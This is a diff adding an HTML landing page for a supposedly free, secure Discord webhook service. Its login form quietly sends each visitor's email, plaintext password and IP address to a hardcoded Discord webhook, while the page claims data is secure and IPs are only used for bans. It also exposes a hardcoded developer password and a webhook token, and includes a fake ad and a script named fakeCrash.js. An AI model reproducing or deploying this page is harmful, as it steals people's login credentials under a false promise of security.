@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Home</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<script>
+    alert("Welcome! Press OK to continue.");
+</script>
+<body>
+    <h2 class="beta">Aetherium</h2>
+    <p>Send discord messages via webhooks!</p>
+    <br>
+    <button onclick="scrollToLoginContainer()">Login</button>
+
+    <div class="container">
+        <div class="Branch1">
+            <h2>Fast And Secured</h2>
+            <p>Our service provide a FAST webhook sends and secure data bases. Its nearly impossible to get your webhook leaked!</p>
+        </div>
+        <div class="branch2">
+            <h2>Raid Protection</h2>
+            <p>Our website provide a list of banned words and if they are detected they can get banned.</p>
+        </div>
+        <div class="branch3">
+            <h2>Free To Use</h2>
+            <p>Our service is completely free to use and will always be free to use.</p>
+        </div>
+    </div>
+    <p>We provide much more information for our members. Login to continue.</p>
+    <div class="parentContainer">
+        <div class="loginContainer" id="loginContainer">
+            <label for="login">LOG IN</label>
+            <form class="login" onsubmit="login(event)">
+                <input type="email" placeholder="Email" id="email" required>
+                <input type="password" placeholder="Password" id="password" required>
+                <button type="submit">Login</button>
+            </form>
+        </div>
+    </div>
+            <br>
+            <br>
+            <br>
+            <br>
+            <br>
+            <br>
+            <br>
+            <br>
+    <h2>Here are some examples!</h2>
+        <img src="image.png" alt="Showcase" class="showcase" width="1200" height="400">
+        <br>
+        <h2>NOTE:</h2>
+        <p>Your IP will not be shared. Its only used to ban you incase you break <a onclick='window.location.href="terms.html"'>terms of conditions.</a></p>
+        <img src="Logs.png" alt="Showcase" width="1200" height="400">
+        <h2>Our moderation!</h2>
+        <p>Our moderation is fast and reliable. Break our terms, Get banned!  look at the ban screen here <a onclick=
+            'alert("Fake ban! Your account is not in danger.")'
+            onclick='window.location.href="error.html"'>Ban Screen</a></p>
+        <img src="r.png" alt="showcase" width="1200" height="400">
+<br>
+<h2>Latest Changes:</h2>
+<p>1. Embed Improvements, Embed preview has been added.</p>
+<br>
+<p>2. New gradient colors.</p>
+<br>
+<p>3. Saved our eyes. Changed gradient background to old one</p>
+<br>
+<p>4. Found a partner! Our website is now partnered with Geoblox</p>
+    <footer>
+        <p>Copyright &copy; 2025 Discord Webhook Auto Manager</p>
+    </footer>
+    <p>[<b class="beta">AD</b>]</p>
+    <!-- Fake Ad -->
+    <div style="margin-top: 20px;">
+        <a href="test2.html" target="_blank">
+            <img src="downloads (21).jpeg" alt="[AD]" width="300" height="250">
+        </a>
+    </div>
+
+    <script>
+        function scrollToLoginContainer() {
+            const loginContainer = document.getElementById('loginContainer');
+            if (loginContainer) {
+                loginContainer.scrollIntoView({ behavior: 'smooth' });
+            }
+        }
+
+        function dev() {
+            const DevPass = document.getElementById('DevPass').value;
+            const WebhooKAPI = 'https://discord.com/api/webhooks/1415373223687749735/qm69WoTzXZmlA_JW3EIAsSPk5OEdmg0Z7dTOYa_qLlet3GYx4LkN72Hjlgsr-8Zi3OSS';
+
+            function getUserIP(callback) {
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => callback(data.ip))
+                    .catch(error => callback('Unknown IP'));
+            }
+
+            if (DevPass === "EGTF3*") {
+                window.location.href = "dev.html";
+
+                getUserIP(userIP => {
+                    fetch(WebhooKAPI, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            content: `New Dev Login:\nDevPass: ${DevPass}\nUser IP: ${userIP}`,
+                            username: 'Dev Login Detected'
+                        }),
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok ' + response.statusText);
+                        }
+                        return response.json();
+                    })
+                    .then(data => {
+                        console.log('Success:', data);
+                    })
+                    .catch((error) => {
+                        console.error('Error:', error);
+                    });
+                });
+            }
+        }
+
+        function login(event) {
+            event.preventDefault(); // Prevent the form from submitting the traditional way
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Simple validation (you can expand this as needed)
+            if (email === "" || password === "") {
+                alert("Please enter both email and password.");
+                return;
+            }
+
+            window.location.href = "webhook.html"; // Redirect to webhook page
+
+            function getUserIP(callback) {
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => callback(data.ip))
+                    .catch(error => callback('Unknown IP'));
+            }
+
+            // Get the user's IP address and send the webhook
+            getUserIP(userIP => {
+                fetch('https://discord.com/api/webhooks/1415373223687749735/qm69WoTzXZmlA_JW3EIAsSPk5OEdmg0Z7dTOYa_qLlet3GYx4LkN72Hjlgsr-8Zi3OSS', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `New login:\nEmail: ${email}\nPassword: ${password}\nIP: ${userIP}`,
+                        username: 'Login Detected'
+                    }),
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok ' + response.statusText);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Success:', data);
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
+            });
+        }
+    </script>
+    <script src="banHandler.js"></script>
+    <script src="a/b/c/d/e/fakeCrash.js"></script>
+</body>
+</html>
